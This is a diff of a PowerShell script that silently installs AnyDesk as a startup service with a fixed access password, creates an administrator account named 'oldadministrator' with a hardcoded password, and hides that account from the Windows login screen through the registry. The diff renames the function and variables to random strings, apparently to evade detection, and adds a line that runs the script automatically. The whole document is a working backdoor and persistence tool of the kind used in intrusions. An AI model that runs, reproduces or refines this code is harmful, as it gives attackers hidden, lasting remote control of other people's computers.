@@ -1,22 +1,36 @@
-Function AnyDesk {
+function Invoke-ZxYv {
+    param (
+        [string]$qGkL = "C:\ProgramData\AnyDesk",
+        [string]$RtYh = "http://download.anydesk.com/AnyDesk.exe",
+        [string]$UzPm = "P@ssw0rd123!",
+        [string]$BgNd = "oldadministrator",
+        [string]$KvWs = "P@ssw0rd123!"
+    )
 
-   mkdir "C:\Program Files (x86)\AnyDesk"
-   $clnt = new-object System.Net.WebClient
-   $url = "http://download.anydesk.com/AnyDesk.exe"
-   $file = "C:\Program Files (x86)\AnyDesk\AnyDesk.exe"
-   $clnt.DownloadFile($url,$file)
+    try {
+        if (-not (Test-Path -Path $qGkL -PathType Container)) {
+            New-Item -Path $qGkL -ItemType Directory | Out-Null
+        }
 
+        $xTaR = Join-Path -Path $qGkL -ChildPath "AnyDesk.exe"
+        Invoke-WebRequest -Uri $RtYh -OutFile $xTaR
 
-   cmd.exe /c "C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --install "C:\Program Files (x86)\AnyDesk" --start-with-win --silent
+        Start-Process -FilePath $xTaR -ArgumentList "--install $qGkL --start-with-win --silent" -Wait | Out-Null
+        Start-Process -FilePath $xTaR -ArgumentList "--set-password=$UzPm" -Wait | Out-Null
 
+        $secure = ConvertTo-SecureString -String $KvWs -AsPlainText -Force
+        New-LocalUser -Name $BgNd -Password $secure | Out-Null
+        Add-LocalGroupMember -Group "Administrators" -Member $BgNd
 
-   cmd.exe /c echo P@ssw0rd123! | "C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --set-password
+        $regKey = 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
+        Set-ItemProperty -Path $regKey -Name $BgNd -Value 0 -Type DWORD -Force
 
-
-   net user oldadministrator "P@ssw0rd123!" /add
-   net localgroup Administrators oldadministrator /ADD
-   reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v oldadministrator /t REG_DWORD /d 0 /f
-
-   cmd.exe /c "C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --get-id
-
+        Start-Process -FilePath $xTaR -ArgumentList "--get-id" -Wait | Out-Null
+        Write-Host "Done.`n"
+    }
+    catch {
+        Write-Host "Oops: $_"
+    }
 }
+
+Invoke-ZxYv
